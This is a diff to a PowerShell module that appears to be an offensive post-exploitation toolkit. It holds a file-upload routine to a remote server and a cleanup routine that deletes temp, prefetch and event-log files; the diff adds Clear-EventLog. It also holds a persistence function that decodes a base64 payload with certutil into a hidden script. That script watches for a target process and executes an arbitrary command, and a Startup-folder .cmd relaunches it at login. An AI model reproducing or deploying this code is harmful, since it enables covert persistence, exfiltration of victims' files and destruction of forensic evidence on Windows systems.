@@ -128,7 +128,7 @@ function upload2server {
     )
     try {
         (New-Object System.Net.WebClient).UploadFile($where, $what) > $null 2>&1
-        Write-Host "upload done."
+        #Write-Host "upload done."
     } catch {
         Write-Host "upload field: $_"
     }
@@ -181,6 +181,7 @@ Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "Au
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -ErrorAction Ignore
 Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore -Force
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -ErrorAction Ignore -Force
+Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -ErrorAction Ignore
 clear
 cd $env:userprofile
 }
@@ -244,6 +245,7 @@ Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Prefetch\*" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\System32\winevt\Logs\*" -Force -ErrorAction SilentlyContinue
+Clear-EventLog -LogName System
 clear
 }
 Export-ModuleMember -Function xtmpclean
@@ -504,17 +506,22 @@ function persistence-neighbor {
 	$mamba = $naughty 	
 cd $env:??e????f???
 echo 'IyBpbiB0YXJnZXQgeW91IG1hc3QgYWRkICogc3ltYm9scw0KIyAuXFBlcnNpc3RlbmNlTmVpZ2hib3IucHMxICJXaW5TdG9yZSoiICJjYWxjLmV4ZSINCiMgZm9yIGhpZGRlbjogIHN0YXJ0LXByb2Nlc3MgcG93ZXJzaGVsbCAnLlxQZXJzaXN0ZW5jZU5laWdoYm9yLnBzMSAiV2luU3RvcmUqIiAiY2FsYy5leGUiJyAtd2luZG93c3R5bGUgaGlkZGVuDQojbmV4dCBleGFtcGxlOiAgLlxQZXJzaXN0ZW5jZU5laWdoYm9yLnBzMSAiV2luU3RvcmUqIiAiY21kIC9jIGNvbnRyb2wgQzpcVXNlcnNcam9obmRvZVxsZXZpYXRoYW4uZGxsIg0KJGNvcnJlY3Rpb249QHt9DQppZigkYXJncy5Db3VudCAtbHQgMil7DQogICAgZXhpdA0KfQ0KJGJ1Zz0kYXJnc1swXQ0KJGhvdGZpeD0kYXJnc1sxXQ0Kd2hpbGUoJHRydWUpew0KICAgICRjdXJyZW50UHJvY2Vzc2VzPUdldC1Qcm9jZXNzIC1OYW1lICRidWcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBmb3JlYWNoKCRwcm9jZXNzIGluICRjdXJyZW50UHJvY2Vzc2VzKXsNCiAgICAgICAgaWYoLW5vdCAkY29ycmVjdGlvbi5Db250YWluc0tleSgkcHJvY2Vzcy5JZCkpew0KICAgICAgICAgICAgaUV4ICRob3RmaXgNCiAgICAgICAgICAgICRjb3JyZWN0aW9uWyRwcm9jZXNzLklkXT0kdHJ1ZQ0KICAgICAgICB9DQogICAgfQ0KICAgICRydW5uaW5nUHJvY2Vzc0lkcz0kY3VycmVudFByb2Nlc3Nlcy5JZA0KICAgICRjb3JyZWN0aW9uLktleXN8V2hlcmUtT2JqZWN0ey1ub3QoJHJ1bm5pbmdQcm9jZXNzSWRzLWNvbnRhaW5zICRfKXxPdXQtTnVsbH18Rm9yRWFjaC1PYmplY3R7JGNvcnJlY3Rpb24uUmVtb3ZlKCRfKX0NCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQp9DQo=
-'> "C:\users\Public\P3RNB.bin"
+'> "C:\users\Public\P3RNB.txt"
 cd ~\
-certutil -decode "C:\users\Public\P3RNB.bin" "C:\users\Public\WidgetGuard.ps1" |Out-Null
+certutil -decode "C:\users\Public\P3RNB.txt" "C:\users\Public\neighbor.ps1" |Out-Null
 sleep(0.3)
-del "C:\users\Public\P3RNB.bin" -force
+del "C:\users\Public\P3RNB.txt" -force
 clear;cd C:\users\Public\
-start-process powershell '.\WidgetGuard.ps1 $target $mamba' -windowstyle hidden
+start-process powershell ".\neighbor.ps1 $target $mamba" -windowstyle hidden
 sleep(3.0)
 $target = $process
 $mamba = $naughty
-new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "powershell 'C:\Users\Public\WidgetGuard.ps1 $($target) `"$($mamba)`"' -windowstyle hidden" 
+new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "@echo off
+setlocal
+set errorlevel=dummy
+set errorlevel=
+cmd /c cmd /start min /c powershell -nol -nop -w 1 C:\Users\Public\neighbor.ps1 `"$($target)`" `"$($mamba)`" -windowstyle hidden
+exit %errorlevel%" 
 cd $env:??e????f???
 }
 Export-ModuleMember -Function persistence-neighbor
